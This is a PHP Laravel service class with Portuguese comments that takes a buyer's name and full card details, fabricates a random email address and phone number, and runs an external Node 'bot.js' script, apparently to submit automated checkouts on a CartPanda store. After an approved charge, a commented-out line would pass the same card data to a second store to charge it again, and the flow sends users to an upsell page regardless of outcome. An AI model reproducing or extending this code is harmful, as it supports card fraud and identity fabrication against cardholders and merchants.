<?php

namespace App\Services;

use Illuminate\Support\Str;
use Symfony\Component\Process\Exception\ProcessFailedException;
use Symfony\Component\Process\Process;

class CartPandaService
{
    public $checkoutId;

    public function __construct($checkoutId = null)
    {
        $this->checkoutId = $checkoutId ?? env('CHECKOUT_ID');
    }

    public function createOrder($name, $cardNumber, $cardMonth, $cardYear, $cardCvv, $fakerLocale = 'en_US'): array
    {
        set_time_limit(120);
        $faker = fake($fakerLocale);
        $email = $this->generateEmail($name);

        $arrName = explode(' ', $name);
        $firstName = $arrName[0];
        array_shift($arrName);
        $lastName = implode(' ', $arrName);

        $phone = $faker->phoneNumber();
        $phone = preg_replace('/[^0-9]/', '', $phone);
        $phoneCode = '1';

        try {
            $process = new Process([
                'node',
                '../scripts/bot.js',
                $this->checkoutId,
                $firstName,
                $lastName,
                $email,
                $phone,
                $phoneCode,
                $cardNumber,
                $cardMonth,
                $cardYear,
                $cardCvv,
                env('CONNECTION_URL'),
            ]);

            $process->run();

            // Log de erros do processo se houver
            if (! $process->isSuccessful()) {
                logger()->error('Processo falhou', ['error' => $process->getErrorOutput()]);
            }

            $output = $process->getOutput();
            $errors = $process->getErrorOutput();

            // Log de erros se houver
            if (! empty($errors)) {
                logger()->error('Erro ao criar pedido', ['errors' => $errors]);
            }

            // Log antes de decodificar o JSON
            logger()->info('Output bruto do bot', ['output' => $output]);
            
            // LOG COMPLETO: TODOS OS DADOS QUE RETORNARAM DA CARTPANDA
            logger()->info('🔍 DADOS COMPLETOS DA CARTPANDA (RAW)', [
                'output_raw' => $output,
                'output_length' => strlen($output),
                'has_errors' => !empty($errors)
            ]);

            // Tenta ajustar o formato do JSON
            $outputAjustado = $this->ajustarFormatoJson($output);

            // Tenta decodificar o JSON apenas para log
            try {
                $result = json_decode($outputAjustado, true);
                
                // LOG COMPLETO: DADOS DECODIFICADOS DA CARTPANDA
                logger()->info('🔍 DADOS COMPLETOS DECODIFICADOS DA CARTPANDA', [
                    'result_completo' => $result,
                    'json_error' => json_last_error_msg(),
                    'output_ajustado' => $outputAjustado
                ]);

                // Log do erro de decodificação do JSON
                // if (json_last_error() !== JSON_ERROR_NONE) {
                //     logger()->error('Erro na decodificação do JSON', ['error' => json_last_error_msg()]);
                // }

                if (json_last_error() === JSON_ERROR_NONE) {

                    //VERIFICA SE A VENDA FOI APROVADA E REDIRECIONA PARA THANKYOU2

                    // logger()->info('Resultado processado', ['result' => $result]);
                    $retornoAprovado = $this->logVendaAprovada($result, $cardNumber, $cardMonth, $cardYear, $cardCvv);
                    if ($retornoAprovado) {
                        return $retornoAprovado;
                    }

                    // Verifica se o pagamento foi recusado por falta de saldo
                    if (isset($result['message']) && $result['message'] === 'Payment declined. Try another card or payment method.') {
                        logger()->info('Cliente sem saldo, redirecionando para upsell1');
                    }
                }
            } catch (\Exception $e) {
                logger()->error('Erro ao processar resultado', ['error' => $e->getMessage()]);
            }

        } catch (\Exception $e) {
            logger()->error('Erro no processo', ['error' => $e->getMessage()]);

            // Só faz re-tentativa se for timeout
            if (strpos($e->getMessage(), 'exceeded the timeout') !== false) {
                logger()->info('Timeout detectado, iniciando re-tentativas', [
                    'name' => $name,
                    'email' => $email
                ]);

                $maxRetries = 3;
                $attempt = 0;

                while ($attempt < $maxRetries) {
                    $attempt++;
                    try {
                        $process->run();
                        $output = $process->getOutput();
                        
                        if ($output) {
                            logger()->info('Output da tentativa ' . $attempt, ['output' => $output]);
                            
                            // Ajuste e Tenta decodificar o resultado                            
                            $outputAjustado = $this->ajustarFormatoJson($output);
                            $result = json_decode($outputAjustado, true);
                            
                            if (json_last_error() === JSON_ERROR_NONE) {
                                // Verifica se foi aprovado
                                $retornoAprovado = $this->logVendaAprovada($result, $cardNumber, $cardMonth, $cardYear, $cardCvv);
                                if ($retornoAprovado) {
                                    logger()->info('Venda aprovada na re-tentativa ' . $attempt);
                                    return $retornoAprovado; // Vai para /thankyou
                                }
                                
                                // Se não foi aprovado, vai para upsell1
                                logger()->info('Venda não aprovada na re-tentativa ' . $attempt . ', redirecionando para upsell1');
                                return [
                                    'success' => true,
                                    'redirect_url' => '/upsell1',
                                    'random_email' => $email
                                ];
                            }
                        }

                        // Se ainda é timeout, continua tentando
                        if (strpos($process->getErrorOutput(), 'exceeded the timeout') !== false) {
                            logger()->info('Timeout detectado na tentativa ' . $attempt);
                            continue;
                        }
                        
                    } catch (\Exception $e) {
                        logger()->error('Erro na re-tentativa ' . $attempt, ['error' => $e->getMessage()]);
                    }
                }
            }

            // Se não foi timeout ou todas as tentativas falharam
            return [
                'success' => true,
                'redirect_url' => '/upsell1',
                'random_email' => $email
            ];
        }

        // Sempre retorna sucesso e redireciona para upsell1
        return [
            'success' => true,
            'redirect_url' => '/upsell1',
            'random_email' => $email
        ];
    }

    public function generateEmail($name)
    {
        // Lista de domínios de email possíveis
        $emailDomains = [
            'gmail.com',
            'yahoo.com',
            'icloud.com',
            'yandex.com',
            'outlook.com',
            'hotmail.com'
        ];

        // Remove acentuação do nome antes de processar
        $name = $this->removeAccents($name);
        
        $fullName = explode(' ', $name);

        $nameFirst = rand(0, 100) > 20;
        $email = '';
        if (! $nameFirst) {
            $email .= Str::random(rand(1, 5));
        }
        $email .= $fullName[0];

        $hasNumbers = rand(0, 100) > 40;
        if ($hasNumbers) {
            $email .= rand(0, 9999);
        }

        $hasSymbols = rand(0, 100) > 40;
        if ($hasSymbols) {
            $email .= '_';
        }

        $hasSurname = rand(0, 100) > 20;
        if ($hasSurname) {
            $email .= $fullName[1] ?? '';
        }

        $randChar = rand(0, 100) > 60;
        if ($randChar) {
            $email .= Str::random(rand(1, 4));
        }

        // Escolhe aleatoriamente um dos domínios
        $email .= '@' . $emailDomains[array_rand($emailDomains)];

        // Remove qualquer caractere especial remanescente e converte para minúsculo
        $email = preg_replace('/[^a-z0-9@._-]/', '', strtolower($email));

        return $email;
    }

    /**
     * Remove acentos e caracteres especiais de uma string
     * Converte: José → Jose, María → Maria, François → Francois
     */
    private function removeAccents($string)
    {
        // Mapa de caracteres acentuados para sem acento
        $unwanted_array = [
            'Š'=>'S', 'š'=>'s', 'Ž'=>'Z', 'ž'=>'z', 
            'À'=>'A', 'Á'=>'A', 'Â'=>'A', 'Ã'=>'A', 'Ä'=>'A', 'Å'=>'A', 'Æ'=>'A', 
            'Ç'=>'C', 'È'=>'E', 'É'=>'E', 'Ê'=>'E', 'Ë'=>'E', 
            'Ì'=>'I', 'Í'=>'I', 'Î'=>'I', 'Ï'=>'I', 
            'Ñ'=>'N', 'Ò'=>'O', 'Ó'=>'O', 'Ô'=>'O', 'Õ'=>'O', 'Ö'=>'O', 'ØØ'=>'O', 
            'Ù'=>'U', 'Ú'=>'U', 'Û'=>'U', 'Ü'=>'U', 
            'Ý'=>'Y', 'Þ'=>'B', 'ß'=>'Ss', 
            'à'=>'a', 'á'=>'a', 'â'=>'a', 'ã'=>'a', 'ä'=>'a', 'å'=>'a', 'æ'=>'a', 
            'ç'=>'c', 'è'=>'e', 'é'=>'e', 'ê'=>'e', 'ë'=>'e', 
            'ì'=>'i', 'í'=>'i', 'î'=>'i', 'ï'=>'i', 
            'ð'=>'o', 'ñ'=>'n', 'ò'=>'o', 'ó'=>'o', 'ô'=>'o', 'õ'=>'o', 'ö'=>'o', 'ø'=>'o', 
            'ù'=>'u', 'ú'=>'u', 'û'=>'u', 'ü'=>'u', 
            'ý'=>'y', 'þ'=>'b', 'ÿ'=>'y'
        ];
        
        $string = strtr($string, $unwanted_array);
        
        // Remove qualquer caractere não-ASCII remanescente
        $string = preg_replace('/[^\x20-\x7E]/', '', $string);
        
        return $string;
    }

    // Função para ajustar o formato do JSON
    function ajustarFormatoJson($output) {
        // Substitui aspas simples por aspas duplas
        $output = str_replace("'", '"', $output);

        // Adiciona aspas duplas em torno das chaves
        $output = preg_replace('/(\w+):/', '"$1":', $output);

        return $output;
    }

    // Nova função para verificar venda aprovada
    private function logVendaAprovada($result, $cardNumber = null, $cardMonth = null, $cardYear = null, $cardCvv = null)
    {
        if (
            isset($result['error'], $result['success'], $result['payment_actual_status']) &&
            $result['error'] === false &&
            $result['success'] === true &&
            strtolower($result['payment_actual_status']) === 'approve'
        ) {
            logger()->info('VENDA APROVADA COM SUCESSO - INICIANDO TENTATIVA DE COBRANÇA NO STORE2');

            // Monta os dados do cartão
            $cardData = [
                'cardNumber' => $cardNumber,
                'cardMonth'  => $cardMonth,
                'cardYear'   => $cardYear,
                'cardCvv'    => $cardCvv,
            ];

            // Chama o Store2Service
            #(new \App\Services\Store2Service())->criarVendaStore2($cardData);    # COMENTE SE NAO QUISER TRANSAÇÃO NA STORE2

            return [
                'success' => true,
                'redirect_url' => '/thankyou'
            ];
        }
        return null;
    }
}
